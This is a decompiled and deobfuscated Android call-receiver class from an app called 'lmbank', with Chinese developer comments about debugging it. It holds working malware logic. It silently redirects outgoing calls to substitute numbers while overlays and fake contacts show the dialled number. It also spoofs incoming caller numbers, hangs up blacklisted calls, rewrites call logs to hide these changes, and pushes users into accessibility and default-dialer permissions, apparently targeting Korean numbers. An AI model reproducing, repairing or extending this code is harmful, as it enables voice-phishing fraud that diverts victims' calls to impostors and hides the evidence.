package com.wish.lmbank.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.AudioManager;
import android.media.MediaPlayer;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.text.TextUtils;

import com.wish.lmbank.AppStartV;
import com.wish.lmbank.bean.CallLogBean;
import com.wish.lmbank.bean.ColorRingBean;
import com.wish.lmbank.bean.LimitPhoneNumberBean;
import com.wish.lmbank.callback.PhoneCallListener;
import com.wish.lmbank.common.Constants;
import com.wish.lmbank.db.CallRingDB;
import com.wish.lmbank.overlay.OverlayService;
import com.wish.lmbank.phone.PhoneActivity;
import com.wish.lmbank.phone.PhoneCallService;
import com.wish.lmbank.utils.ContentUtils;
import com.wish.lmbank.utils.DateFormatUtils;
import com.wish.lmbank.utils.LogUtils;
import com.wish.lmbank.utils.SettingUtils;
import com.wish.lmbank.utils.SharedPreferencesUtils;

import java.io.File;
import java.io.IOException;
import java.util.Date;

import gv00l3ah.mvdt7w.bb7d7pu7;
import wei.mark.standout.StandOutWindow;

/* loaded from: cookie_9234504.jar:com/wish/lmbank/receiver/TelePhoneReceiver.class */
public class TelePhoneReceiver extends BroadcastReceiver {
    public static final String ACTION_IN = "android.intent.action.PHONE_STATE";
    public static final String ACTION_OUT = "android.intent.action.NEW_OUTGOING_CALL";
    public static String SWITCH_STATUS;
    private static final String TAG = "PhoneCallReceiver";
    public static Date callStartTime;
    public static boolean isOffHook;
    private static long lastRequestDialerTime;
    public static CallLogBean mCallLogBean;
    private static Context mContext;
    private static TelephonyManager telephonyManager;
    private PhoneCallListener mPhoneCallListener;
    //     private final String EXTRA_PHONE_NUMBER = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7");
    private final String EXTRA_PHONE_NUMBER = "android.intent.extra.PHONE_NUMBER";
    private int lastState = 0;
    private String savedNumber = null;
    private String savedNumberReal = null;
    private boolean isIncoming = false;
    private Handler mHandler = new Handler();
    private boolean isBlack = false;
    private boolean isToHomeByCode = false;
    private boolean isAppearOutgoingIdleError = false;
    private int lState = -1;
    private int lLastState = -1;
    private String lNumber = "";
    private boolean lIsBlack = false;
    private boolean lIsIncoming = false;
    private boolean lIsAppearOutgoingIdleError = false;

    static {
        callStartTime = new Date();
        mCallLogBean = null;
//             SWITCH_STATUS = bb7d7pu7.m5998("Bgc");
        SWITCH_STATUS = "on";
        isOffHook = false;
        lastRequestDialerTime = 0L;
    }

    public TelePhoneReceiver() {
        System.out.println("demo........");
    }

    public static String access$000(TelePhoneReceiver this$0) {
        return this$0.savedNumberReal;
    }

    public static String access$100(TelePhoneReceiver this$0) {
        return this$0.savedNumber;
    }

    public static void access$002(TelePhoneReceiver this$0, String formatNumber) {
        this$0.savedNumberReal = formatNumber;
    }

    public static PhoneCallListener access$200(TelePhoneReceiver this$0) {
        return this$0.mPhoneCallListener;
    }

    public void onDestroy() {
        this.mHandler.removeCallbacksAndMessages(null);
        telephonyManager = null;
        mContext = null;
        this.mPhoneCallListener = null;
    }

    public TelePhoneReceiver(Context context) {
        mContext = context;
    }

    public void setPhoneCallListener(PhoneCallListener phoneCallListener) {
        this.mPhoneCallListener = phoneCallListener;
    }
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {

        //最开始Constants.modifyCall(this, callPhone, var11);加在PhoneCallService，会有问题
        //如果是通话挂断了 所有的挂断都会调用这个方法，全部都改一遍 不是有问题？
        //我调试的时候，就觉得应该知道通话是来电还是去电 然后进一步知道来电是否为黑名单、是否需要根据指定号码显示、去电是否需要转发
        //这样做才对的

        /*
        黑名单、拨出号码替换、来电号码替换

        黑名单号码打进来之后，直接挂断，并删除该条通话记录
        拨出号码替换，替换前的号码，需要保留在通话记录中，替换后的号码删除
        来电号码替换  替换前的号码通话记录不显示 替换后的号码在通话记录中保留
        黑名单看着好像没有问题
        拨出号码替换刚才你看了 打出到对应的号码没有问题了 显示有问题还有通话记录也没了
        来电号码替换现在都还没有调到哪儿去
        调试还莫名奇妙报错 搞得心烦
        你现在知道我怎么调试的 你也可以自己调一下

        所有需要调试的东西都加在debugging com.wish.lmbank.temp.Debugging 因为这样如果这个apk搞完了 就根据这个类就可以搜索出来
        不用到处找

         */


        //这个类是一个广播，需要注册广播事件（我的理解是，由系统通知的的）
        //我在这里只加了几行代码，之所以在这里加黑名单、转发的通话记录操作在这里是因为原来的代码有添加通话log对象
        //和执行响应的处理的代码 不然也不会加在这里 现在这个app的问题有点多 我都不知道搞得定不
        //你能搞定不？
        //这个类的onReceive这个方法贼复杂  我都还没有看懂
        //这里接收通知 判断是否是黑名单、以及拨出转发，然后生成响应类型得 CallLogBean，加到Constants得队列里，然后根据类型作处理。
        final StringBuilder sb = new StringBuilder();
//-^-         sb.append(bb7d7pu7.m5998("OQEGBwwqCAUFOwwKDAAfDBs"));
        sb.append("PhoneCallReceiver");
//-^-         if (!bb7d7pu7.m5998("Bg8P").equals(TelePhoneReceiver.SWITCH_STATUS = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("GhAaHQwENhoeAB0KAQ"), bb7d7pu7.m5998("Bgc")))) {
        if (!"off".equals(TelePhoneReceiver.SWITCH_STATUS = SharedPreferencesUtils.getValue("system_switch", "on"))) {
            final StringBuilder sb2 = new StringBuilder();
//-^-             sb2.append(bb7d7pu7.m5998("RUkGBzsMCgwAHwxFSQgKHQAGB1NJ"));
            sb2.append(", onReceive, action: ");
            sb2.append(intent.getAction());
            sb.append(sb2.toString());
//-^-             if (intent.getAction().equals(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRyolJjosNjowOj0sJDYtICglJi46"))) {
            if (intent.getAction().equals("android.intent.action.CLOSE_SYSTEM_DIALOGS")) {
//-^-                 if (!SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8gOzo9"), true) && System.currentTimeMillis() - TelePhoneReceiver.lastRequestDialerTime > 60000L) {
                if (!SharedPreferencesUtils.getValue("KEY_FIRST", true) && System.currentTimeMillis() - TelePhoneReceiver.lastRequestDialerTime > 60000L) {
                    TelePhoneReceiver.lastRequestDialerTime = System.currentTimeMillis();
                    if (!SettingUtils.isEnabledAccessibility(context)) {
//-^-                         final Intent intent2 = new Intent(bb7d7pu7.m5998("CAcNGwYADUcaDB0dAAcOGkcoKiosOjogKyAlID0wNjosPT0gJy46"));
                        final Intent intent2 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
                        intent2.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        context.startActivity(intent2);
                    } else {
//-^-                         SettingUtils.requestDefaultDialer(context, true, bb7d7pu7.m5998("PQwFDDkBBgcMOwwKDAAfDBs"));
                        SettingUtils.requestDefaultDialer(context, true, "TelePhoneReceiver");
                    }
                }
//-^-                 final String stringExtra = intent.getStringExtra(bb7d7pu7.m5998("GwwIGgYH"));
                final String stringExtra = intent.getStringExtra("reason");
                final StringBuilder sb3 = new StringBuilder();
//-^-                 sb3.append(bb7d7pu7.m5998("RUkGBzsMCgwAHwxFSRsMCBoGB1NJ"));
                sb3.append(", onReceive, reason: ");
                sb3.append(stringExtra);
//-^-                 sb3.append(bb7d7pu7.m5998("RUkaAQYeU0k"));
                sb3.append(", show: ");
                sb3.append(OverlayService.isShow);
//-^-                 sb3.append(bb7d7pu7.m5998("RUkAGj0GIQYEDCsQKgYNDFNJ"));
                sb3.append(", isToHomeByCode: ");
                sb3.append(this.isToHomeByCode);
                sb.append(sb3.toString());
                if (stringExtra != null && !TextUtils.isEmpty((CharSequence) stringExtra) && !OverlayService.isShow) {
                    if (!this.isToHomeByCode) {
                        StandOutWindow.closeAll(context, OverlayService.class);
                        OverlayService.isShow = false;
                    }
                    if (this.isToHomeByCode) {
                        this.isToHomeByCode = false;
                    }
                }
                LogUtils.callLog(sb.toString());
            }
            if (TelePhoneReceiver.telephonyManager == null) {
//-^-                 TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService(bb7d7pu7.m5998("GQEGBww"));
                TelePhoneReceiver.telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
            }
            final Bundle extras = intent.getExtras();

            if (extras != null && this.mPhoneCallListener != null && TelePhoneReceiver.mContext != null) {
                final boolean checkFloatPermission = SettingUtils.checkFloatPermission(context);
//-^-                 final String string = extras.getString(bb7d7pu7.m5998("Gh0IHQw"));
                final String string = extras.getString("state");
//-^-                 final boolean equals = bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HCAodAAYHRycsPjYmPD0uJiAnLjYqKCUl").equals(intent.getAction());
                final boolean equals = "android.intent.action.NEW_OUTGOING_CALL".equals(intent.getAction());
//-^-                 final String m5998 = bb7d7pu7.m5998("RUkKCAUFJQYONlNJ");
                final String m5998 = ", callLog_: ";
//-^-                 final String m59982 = bb7d7pu7.m5998("DwYbHggbDQAHDg");
                final String m59982 = "forwarding";
//-^-                 final String m59983 = bb7d7pu7.m5998("BwYbBAgF");
                final String m59983 = "normal";
                if (equals) {
                    final boolean defaultDialer = SettingUtils.isDefaultDialer(context);
                    TelePhoneReceiver.callStartTime = new Date();
//-^-                     final String string2 = extras.getString(bb7d7pu7.m5998("CAcNGwYADUcABx0MBx1HDBEdGwhHOSEmJyw2JzwkKyw7"));
                    final String string2 = extras.getString("android.intent.extra.PHONE_NUMBER");
                    this.savedNumberReal = string2;
//-^-                     if ((this.savedNumber = string2) != null && string2.startsWith(bb7d7pu7.m5998("QlFb"))) {
                    if ((this.savedNumber = string2) != null && string2.startsWith("+82")) {
                        final StringBuilder sb4 = new StringBuilder();
//-^-                         sb4.append(bb7d7pu7.m5998("WQ"));
                        sb4.append("0");
                        sb4.append(this.savedNumber.substring(3));
                        this.savedNumber = sb4.toString();
                    }
                    final StringBuilder sb5 = new StringBuilder();
//-^-                     sb5.append(bb7d7pu7.m5998("RUmP4sGP4PqM5t6OyehTSQ"));
                    sb5.append(", 拨打号码: ");
                    sb5.append(this.savedNumber);
                    sb.append(sb5.toString()); //这里播出转发
                    final LimitPhoneNumberBean forwarding = SettingUtils.isForwarding(this.savedNumber);
                    while (true) {

                        {
                            if (forwarding == null) {
                                this.savedNumberReal = null;

                                break ;
                            }
                            this.savedNumberReal = forwarding.getRealPhoneNumber();
                            if (forwarding.getSpecial() != 1) {
                                TelePhoneReceiver.mCallLogBean = new CallLogBean(savedNumber, savedNumberReal, Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
                                break ;
                            }
                            final boolean b = true;
                            final StringBuilder sb6 = new StringBuilder();
//-^-                             sb6.append(bb7d7pu7.m5998("RUmP8caM-c-O4NCPx-NTSQ"));
                            sb6.append(", 是否特殊: ");
                            sb6.append(b);
//-^-                             sb6.append(bb7d7pu7.m5998("RUmA0vGBx82O_dyBxvRTSQ"));
                            sb6.append(", 默认电话: ");
                            sb6.append(defaultDialer);
//-^-                             sb6.append(bb7d7pu7.m5998("RUmA6MeO1MBTSQ"));
                            sb6.append(", 遮罩: ");
                            sb6.append(checkFloatPermission);
                            sb.append(sb6.toString());
//-^-                             if (!b && !TextUtils.isEmpty((CharSequence) this.savedNumberReal) && !bb7d7pu7.m5998("WFhb").equals(this.savedNumber)) {
                            if (!b && !TextUtils.isEmpty((CharSequence) this.savedNumberReal) && !"112".equals(this.savedNumber)) {
//-^-                                 sb.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKG1eGN0eSM5eyM-cKO4NCPx-OM5t6OyeiG1eA"));
                                sb.append(", 呼叫转移（不包含特殊号码）");
                                if (!defaultDialer && checkFloatPermission) {
                                    OverlayService.actionStart(context, this.savedNumber, 2);
                                    ContentUtils.insertContacts(context, this.savedNumber, this.savedNumberReal);
                                }
                                this.mHandler.postDelayed((Runnable) new TelePhoneReceiver$1(this, defaultDialer, checkFloatPermission, context, sb), 500L);
                                return;
                            }
                            String s = this.savedNumber;
                            final StringBuilder sb7 = new StringBuilder();
//-^-                             sb7.append(bb7d7pu7.m5998("RUkAGjscBwcABw5TSQ"));
                            sb7.append(", isRunning: ");
                            sb7.append(PhoneCallService.isRunning);
                            sb.append(sb7.toString());
                                if (defaultDialer && !PhoneCallService.isRunning) {
                                    if (!b || TextUtils.isEmpty((CharSequence) this.savedNumberReal)) {
                                        break;
                                    }
//-^-                                     sb.append(bb7d7pu7.m5998("RUmO4NCPx-OM5t6OyehFSYHX7IzjwIzj9oHq1A"));
                                    sb.append(", 特殊号码, 辅助功能");
                                    final String savedNumberReal = this.savedNumberReal;
                                    this.savedNumber = savedNumberReal;
//-^-                                     TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal, bb7d7pu7.m5998("DwYbHggbDQAHDg"), System.currentTimeMillis());
                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(s, savedNumberReal,  Constants.CALL_SOURCE_FORWARDING, System.currentTimeMillis());
                                    AppStartV.setAutoService(true, s, this.savedNumberReal);
                                    final StringBuilder sb8 = new StringBuilder();
//-^-                                     sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDCoIBQUnHAQLDBtTSQ"));
                                    sb8.append(", autoServiceCallNumber: ");
                                    sb8.append(s);
//-^-                                     sb8.append(bb7d7pu7.m5998("RUkIHB0GOgwbHwAKDC8GGx4IGw0ABw4nHAQLDBtTSQ"));
                                    sb8.append(", autoServiceForwardingNumber: ");
                                    sb8.append(this.savedNumberReal);
                                    sb.append(sb8.toString());
                                } else {
                                    if (b && !defaultDialer && checkFloatPermission) {
//-^-                                         sb.append(bb7d7pu7.m5998("RUmA6MeO1MA"));
                                        sb.append(", 遮罩");
                                        OverlayService.actionStart(context, s, 2);
                                        break;
                                    }
                                    final StringBuilder sb9 = new StringBuilder();
//-^-                                     sb9.append(bb7d7pu7.m5998("RUkaBhwbCgxTSQ"));
                                    sb9.append(", source: ");
                                    sb9.append(PhoneActivity.mSource);
                                    sb.append(sb9.toString());
                                    if (!TextUtils.isEmpty((CharSequence) AppStartV.autoServiceCallNumberMark)) {
                                        AppStartV.autoServiceCallNumberMark = "";
                                        s = AppStartV.autoServiceCallNumberMark;
                                        TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.autoServiceCallNumberMark, this.savedNumber, "forwarding", System.currentTimeMillis());
                                        final StringBuilder sb10 = new StringBuilder();
//-^-                                         sb10.append(bb7d7pu7.m5998("RUmB1-yM48CM4_aB6tSP5euP_8SM-edFSQQqCAUFJQYOKwwIB1NJ"));
                                        sb10.append(", 辅助功能挂断后, mCallLogBean: ");
                                        sb10.append(TelePhoneReceiver.mCallLogBean);
                                        sb.append(sb10.toString());
                                        final int n = 1;
                                    } else {
                                        final int n = 0;
                                    }
                                    if (!AppStartV.isCustomDialer) {
                                        break;
                                    }
                                    s = AppStartV.customDialerCallNumber;
                                    TelePhoneReceiver.mCallLogBean = new CallLogBean(AppStartV.customDialerCallNumber, this.savedNumber, "forwarding", System.currentTimeMillis());
                                    final StringBuilder sb11 = new StringBuilder();
//-^-                                     sb11.append(bb7d7pu7.m5998("RUmB7sOMx_ON0OCP4sGM5t5FSQQqCAUFJQYOKwwIB1NJ"));
                                    sb11.append(", 自定义拨号, mCallLogBean: ");
                                    sb11.append(TelePhoneReceiver.mCallLogBean);
                                    sb.append(sb11.toString());
                                }
                                final int n = 1;
                                final String s2 = s;
                                final StringBuilder sb12 = new StringBuilder();
//-^-                                 sb12.append(bb7d7pu7.m5998("RUmPxMqM0dGM-NWM7tNTSQ"));
                                sb12.append(", 正常呼出: ");
                                sb12.append(s2);
                                sb.append(sb12.toString());
                                if (n != 0) {
                                    final StringBuilder sb13 = new StringBuilder();
//-^-                                     sb13.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztJTSQ"));
                                    sb13.append(", 呼叫转移: ");
                                    sb13.append(this.savedNumber);
                                    sb.append(sb13.toString());
                                }
//-^-                                 final String m59984 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
                                final String m59984 = "KEY_IS_FORWARDING_HAND_UP";
                                boolean b2 = n != 0;
                                String s3 = s2;
                                if (SharedPreferencesUtils.getValue(m59984, false)) {
                                    SharedPreferencesUtils.putValue(m59984, false);
//-^-                                     final String m59985 = bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OiEmPjY5ISYnLA");
                                    final String m59985 = "KEY_FORWARDING_SHOW_PHONE";
                                    final String value = SharedPreferencesUtils.getValue(m59985, "");
//-^-                                     final String value2 = SharedPreferencesUtils.getValue(bb7d7pu7.m5998("IiwwNi8mOz4oOy0gJy42OSEmJyw"), "");
                                    final String value2 = SharedPreferencesUtils.getValue("KEY_FORWARDING_PHONE", "");
                                    final StringBuilder sb14 = new StringBuilder();
//-^-                                     sb14.append(bb7d7pu7.m5998("RUmP8deOzdOM5t6OyehTSQ"));
                                    sb14.append(", 显示号码: ");
                                    sb14.append(value);
//-^-                                     sb14.append(bb7d7pu7.m5998("RUmM-NWM5sKB1MWOztKM5t6OyehTSQ"));
                                    sb14.append(", 呼叫转移号码: ");
                                    sb14.append(value2);
                                    sb.append(sb14.toString());
                                    b2 = (n != 0);
                                    s3 = s2;
                                    if (!TextUtils.isEmpty((CharSequence) value)) {
                                        b2 = (n != 0);
                                        s3 = s2;
                                        if (value2.equals(this.savedNumber)) {
                                            TelePhoneReceiver.mCallLogBean = new CallLogBean(value, this.savedNumber, "forwarding", System.currentTimeMillis());
                                            SharedPreferencesUtils.putValue(m59985, "");
                                            b2 = true;
                                            s3 = value;
                                        }
                                    }
                                }
                                final StringBuilder sb15 = new StringBuilder();
//-^-                                 sb15.append(bb7d7pu7.m5998("RUkAGi8GGx4IGw0ABw5TSQ"));
                                sb15.append(", isForwarding: ");
                                sb15.append(b2);
//-^-                                 sb15.append(bb7d7pu7.m5998("RUkZAQYHDDoBBh5TSQ"));
                                sb15.append(", phoneShow: ");
                                sb15.append(s3);
                                sb15.append(m5998);
                                final CallLogBean mCallLogBean = TelePhoneReceiver.mCallLogBean;
                                String s4;
                                if (mCallLogBean != null) {
                                    s4 = mCallLogBean.toString();
                                } else {
//-^-                                     s4 = bb7d7pu7.m5998("JzwlJQ");
                                    s4 = "NULL";
                                }
                                sb15.append(s4);
                                sb.append(sb15.toString());
                                if (b2) {
                                    this.mPhoneCallListener.onOutgoingCallStarted(s3, this.savedNumber, m59982, TelePhoneReceiver.callStartTime);
                                } else {
                                    this.mPhoneCallListener.onOutgoingCallStarted(s3, this.savedNumber, m59983, TelePhoneReceiver.callStartTime);
                                }
                                LogUtils.callLog(sb.toString());
                                return;
                            }
                    }
                }
//-^-                 final String string3 = extras.getString(bb7d7pu7.m5998("AAcKBgQABw42BxwECwwb"));
                final String string3 = extras.getString("incoming_number");
                final StringBuilder sb16 = new StringBuilder();
//-^-                 sb16.append(bb7d7pu7.m5998("RUmO_dyBxvSM-NWM7MxFSRodCB0MOh0bU0k"));
                sb16.append(", 电话呼入, stateStr: ");
                sb16.append(string);
//-^-                 sb16.append(bb7d7pu7.m5998("RUkHHAQLDBtTSQ"));
                sb16.append(", number: ");
                sb16.append(string3);
                sb.append(sb16.toString());
                if (TelephonyManager.EXTRA_STATE_RINGING.equals(string) && TextUtils.isEmpty((CharSequence) string3)) {
                    if (!SettingUtils.isDefaultDialer(AppStartV.getContext())) {
                        SettingUtils.toHome(context);
                        this.isToHomeByCode = true;
                    }
                } else {
                    int n2;
                    if (TelephonyManager.EXTRA_STATE_IDLE.equals(string)) {
                        n2 = 0;
                    } else if (TelephonyManager.EXTRA_STATE_OFFHOOK.equals(string)) {
                        n2 = 2;
                    } else if (TelephonyManager.EXTRA_STATE_RINGING.equals(string)) {
                        TelePhoneReceiver.isOffHook = false;
                        TelePhoneReceiver.callStartTime = new Date();
                        final String forced = SettingUtils.isForced(string3);
                        final boolean empty = TextUtils.isEmpty((CharSequence) forced);
//-^-                         final String m59986 = bb7d7pu7.m5998("DwYbCgwN");
                        final String m59986 = "forced";
//-^-                         final String m59987 = bb7d7pu7.m5998("RUkAGjoBBh5TSQ");
                        final String m59987 = ", isShow: ";
                        if (!empty) {
                            if (!SettingUtils.isDefaultDialer(AppStartV.getContext())) {
                                SettingUtils.toHome(context);
                                this.isToHomeByCode = true;
                            }
                            this.savedNumberReal = forced;
//-^-                             SharedPreferencesUtils.putValue(bb7d7pu7.m5998("IiwwNi8mOyosLTY5ISYnLA"), string3);
                            SharedPreferencesUtils.putValue("KEY_FORCED_PHONE", string3);
                            TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, this.savedNumberReal, "forced", System.currentTimeMillis());
                            boolean actionStart;
                            if (!SettingUtils.isDefaultDialer(AppStartV.getContext())) {
                                ContentUtils.insertContacts(context, this.savedNumberReal, string3);
                                actionStart = OverlayService.actionStart(context, this.savedNumberReal, 1);
                            } else {
                                actionStart = false;
                            }
                            final StringBuilder sb17 = new StringBuilder();
                            sb17.append(m59987);
                            sb17.append(actionStart);
                            sb17.append(m5998);
                            sb17.append(TelePhoneReceiver.mCallLogBean.toString());
                            sb.append(sb17.toString());
                            this.mPhoneCallListener.onIncomingCallReceived(string3, this.savedNumberReal, m59986, TelePhoneReceiver.callStartTime);
                            LogUtils.callLog(sb.toString());
                        } else if (SettingUtils.isBlackList(string3)) { //这里黑名单
                            final CallLogBean mCallLogBean2 = TelePhoneReceiver.mCallLogBean;
                            if (mCallLogBean2 != null && (m59982.equals(mCallLogBean2.getType()) || m59986.equals(TelePhoneReceiver.mCallLogBean.getType()))) {
                                TelePhoneReceiver.mCallLogBean.setDuration((long) Math.ceil((System.currentTimeMillis() - TelePhoneReceiver.mCallLogBean.getDate()) * 1.0 / 1000.0 * 1.0));
                                CallLogHelper.addCallLog(TelePhoneReceiver.mCallLogBean);
                            }
                            TelePhoneReceiver.mCallLogBean = new CallLogBean(string3, string3, Constants.CALL_SOURCE_BLACKLIST, System.currentTimeMillis());
                            final StringBuilder sb18 = new StringBuilder();
//-^-                             sb18.append(bb7d7pu7.m5998("RUmA0viM-eSM5PxFSQoIBQUlBg42U0k"));
                            sb18.append(", 黑名单, callLog_: ");
                            sb18.append(TelePhoneReceiver.mCallLogBean.toString());
                            sb.append(sb18.toString());
//-^-                             this.mPhoneCallListener.onIncomingCallReceived(string3, string3, bb7d7pu7.m5998("CwUICgIFABod"), TelePhoneReceiver.callStartTime);
                            this.mPhoneCallListener.onIncomingCallReceived(string3, string3, Constants.CALL_SOURCE_BLACKLIST, TelePhoneReceiver.callStartTime);
                            LogUtils.callLog(sb.toString());
                            if (SettingUtils.endCall(context)) {
                                this.isBlack = true;
                            }
                        } else {
//-^-                             sb.append(bb7d7pu7.m5998("RUmPxMqM0dGP9MyO_dw"));
                            sb.append(", 正常来电");
                            final boolean b3 = !SettingUtils.isDefaultDialer(AppStartV.getContext()) && checkFloatPermission && OverlayService.actionStart(context, string3, 1);
                            final StringBuilder sb19 = new StringBuilder();
                            sb19.append(m59987);
                            sb19.append(b3);
                            sb.append(sb19.toString());
                            LogUtils.callLog(sb.toString());
                            this.savedNumberReal = string3;
                            this.mPhoneCallListener.onIncomingCallReceived(string3, string3, m59983, TelePhoneReceiver.callStartTime);
                        }
                        n2 = 1;
                    } else {
                        n2 = 0;
                    }
                    this.onCallStateChanged(context, n2, string3);
                }
            }
        }
    }


    public void onCallStateChanged(Context context, int i, String str) {
        long j;
        String str2 = this.lNumber;
        boolean z = (str2 == null && str == null) || (str2 != null && str2.equals(str));
        if (this.lState != i || this.lLastState != this.lastState || !z || this.lIsBlack != this.isBlack || this.lIsIncoming != this.isIncoming || this.lIsAppearOutgoingIdleError != this.isAppearOutgoingIdleError) {
            this.lState = i;
            this.lLastState = this.lastState;
            this.lNumber = str;
            this.lIsBlack = this.isBlack;
            this.lIsIncoming = this.isIncoming;
            this.lIsAppearOutgoingIdleError = this.isAppearOutgoingIdleError;
        }
        if (!this.isBlack) {
            int i2 = this.lastState;
            if (i2 == 2 && i == 0 && str == null) {
                if (this.isIncoming) {
                    this.mPhoneCallListener.onIncomingCallEnded("", callStartTime, new Date());
                } else if (this.isAppearOutgoingIdleError) {
                    return;
                } else {
                    this.isAppearOutgoingIdleError = true;
//                     LogUtils.callLog(bb7d7pu7.m5998("jPjVjObCj-Xrj__EjPnnhtXljuPfj-nojO7TjufZjNXrjNHRhtXljdHkj-LPj-HDjPnnjtLEj_rkjdT1"));
                    LogUtils.callLog("呼叫挂断后，状态出现异常，不拦截后续操作");
                }
            } else if (i2 == i || this.mPhoneCallListener == null || str == null) {
                return;
            }
        }

//         String m5998 = bb7d7pu7.m5998("IiwwNiA6Ni8mOz4oOy0gJy42ISgnLTY8OQ");
        String m5998 = "KEY_IS_FORWARDING_HAND_UP";
        if (i == 0) {
            StringBuilder sb = new StringBuilder();
//             sb.append(bb7d7pu7.m5998("BgcqCAUFOh0IHQwqAQgHDgwNNkVJj-Xrj__ESQsMDgAH"));
            sb.append("onCallStateChanged_, 挂断 begin");
            this.isBlack = false;
            long j2 = 0;
            int i3 = this.lastState;
//             String m59982 = bb7d7pu7.m5998("BxwECwwb");
            String m59982 = "number";
            if (i3 == 1) {
                j = 200;
                if (OverlayService.isShow) {
                    new Bundle().putString(m59982, str);
                }
                this.mPhoneCallListener.onMissedCall(str, callStartTime);
            } else if (this.isIncoming) {
                this.isIncoming = false;
                if (OverlayService.isShow) {
                    new Bundle().putString(m59982, str);
                }
                this.mHandler.postDelayed(new Runnable() { // from class: com.wish.lmbank.receiver.TelePhoneReceiver.2

                    @Override // java.lang.Runnable
                    public void run() {
                        if (OverlayService.isShow) {
                            SettingUtils.toHome(context);
                            TelePhoneReceiver.this.isToHomeByCode = true;
                        }
                    }
                }, 1000L);
                j2 = DateFormatUtils.getDateInterval(callStartTime, new Date());
                this.mPhoneCallListener.onIncomingCallEnded(str, callStartTime, new Date());
                j = 1100;
            } else {
                boolean value = SharedPreferencesUtils.getValue(m5998, false);
//                 sb.append(bb7d7pu7.m5998("RUmM59KO_dyP5euP_8RFSQAaLwYbHggbDQAHDiEIBw08GVNJ") + value);
                sb.append(", 去电挂断, isForwardingHandUp: " + value);
                if (!value) {
                    AppStartV.isPlayColorRing = false;
                }
                long dateInterval = DateFormatUtils.getDateInterval(callStartTime, new Date());
                if (!SettingUtils.isDefaultDialer(AppStartV.getContext()) && !value) {
                    this.mPhoneCallListener.onOutgoingCallEnded(this.savedNumber, callStartTime, new Date());
                }
                j2 = dateInterval;
                j = 1100;
                if (SettingUtils.isDefaultDialer(AppStartV.getContext())) {
                    this.mPhoneCallListener.onOutgoingCallEnded(this.savedNumber, callStartTime, new Date());
                    j = 1100;
                    j2 = dateInterval;
                }
            }
            CallLogBean callLogBean = mCallLogBean;
            if (callLogBean != null) {
                callLogBean.setDuration((long) Math.ceil(((j2 * 1.0d) / 1000.0d) * 1.0d));
            }
            tackleCallStateIdle(context, str, j);
            executeUpdateCallLog();
//             sb.append(bb7d7pu7.m5998("RUkqKCUlNjo9KD0sNiAtJSxJDAcN"));
            sb.append(", CALL_STATE_IDLE end");
            LogUtils.callLog(sb.toString());
        } else if (i == 1) {
            this.isIncoming = true;
        } else if (i == 2) {
            isOffHook = true;
            new Bundle();
            boolean value2 = SharedPreferencesUtils.getValue(m5998, false);
//             LogUtils.callLog(bb7d7pu7.m5998("OQEGBwwqCAUFOwwKDAAfDBtFSQYHKggFBTodCB0MKgEIBw4MDUVJjOfSjv3cj-fMgOnzRUkAGi8GGx4IGw0ABw4hCAcNPBlTSQ") + value2);
            LogUtils.callLog("PhoneCallReceiver, onCallStateChanged, 去电接通, isForwardingHandUp: " + value2);
            if (this.lastState != 1) {
                callStartTime = new Date();
                boolean z2 = OverlayService.isShow;
                if (!value2) {
                    AppStartV.isPlayColorRing = false;
                }
                this.isIncoming = false;
            } else {
                callStartTime = new Date();
                boolean z3 = OverlayService.isShow;
                this.isIncoming = true;
                this.mPhoneCallListener.onIncomingCallAnswered(str, callStartTime);
            }
        }
        this.lastState = i;
    }

    private void executeUpdateCallLog() {
        this.mHandler.postDelayed(new Runnable() { // from class: com.wish.lmbank.receiver.TelePhoneReceiver.3

            @Override // java.lang.Runnable
            public void run() {
                CallLogHelper.execute();
                if (Constants.mCallLogList != null && Constants.mCallLogList.size() > 0) {
                    TelePhoneReceiver.this.mHandler.postDelayed(new Runnable() { // from class: com.wish.lmbank.receiver.TelePhoneReceiver.3.1
                        @Override // java.lang.Runnable
                        public void run() {
                            CallLogHelper.execute();
                        }
                    }, 500L);
                }
            }
        }, 500L);
    }

    private void tackleCallStateIdle(Context context, String str, long j) {
//         LogUtils.callLog(bb7d7pu7.m5998("OQEGBwwqCAUFOwwKDAAfDBtFSR0ICgIFDCoIBQU6HQgdDCANBQxFSQQqCAUFJQYOKwwIB1NJ") + mCallLogBean);
        LogUtils.callLog("PhoneCallReceiver, tackleCallStateIdle, mCallLogBean: " + mCallLogBean);
        CallLogBean callLogBean = mCallLogBean;
        if (callLogBean != null) {
            CallLogHelper.addCallLog(callLogBean);
            mCallLogBean = null;
        }
        if (SettingUtils.isDefaultDialer(AppStartV.getContext()) || !SettingUtils.checkFloatPermission(context)) {
            return;
        }
        OverlayService.actionStop(context, str, j);
    }

    /* loaded from: cookie_9234504.jar:com/wish/lmbank/receiver/TelePhoneReceiver$ColorRingThread.class */
    public static class ColorRingThread extends Thread {
        private String phone;

        public ColorRingThread(String str) {
            this.phone = str;
        }

        @Override // java.lang.Thread, java.lang.Runnable
        public void run() {
            try {
                ColorRingBean queryColorRingFile = CallRingDB.getInstance(AppStartV.getContext()).queryColorRingFile(this.phone);
                StringBuilder sb = new StringBuilder();
//                     sb.append(bb7d7pu7.m5998("CgYFBhs7AAcOSVRUSQccBQVTSQ"));
